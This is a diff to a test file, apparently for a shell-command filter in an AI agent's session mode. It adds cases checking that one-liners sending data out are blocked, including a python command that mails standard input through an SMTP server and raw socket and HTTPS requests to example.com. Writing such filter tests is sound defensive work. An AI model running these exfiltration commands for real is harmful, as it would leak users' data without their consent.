@@ -103,6 +103,10 @@ test("session mode blocks shell commands that send data out", () => {
     "node -e \"fetch('https://example.com', {method: 'POST', body: 'draft'})\"",
     "python3 -c \"import requests; requests.post('https://example.com', data='draft')\"",
     "cd /tmp && node -e 'require(\"https\").request({host: \"example.com\"})'",
+    "python3 -c \"import sys, smtplib; smtplib.SMTP('smtp.example.com').sendmail('a@example.com', 'b@example.com', sys.stdin.read())\"",
+    "python3 -c \"from smtplib import SMTP; SMTP('smtp.example.com')\"",
+    "python3 -c \"__import__('socket').create_connection(('example.com', 80))\"",
+    "node -e \"import('node:https').then((h) => h.request('x'))\"",
   ]) assert.match(decideShell(c) ?? "", /blocked a shell command/, c);
   for (const c of [
     "git log --since=2026-07-20 --no-merges --numstat --format=--%cs",
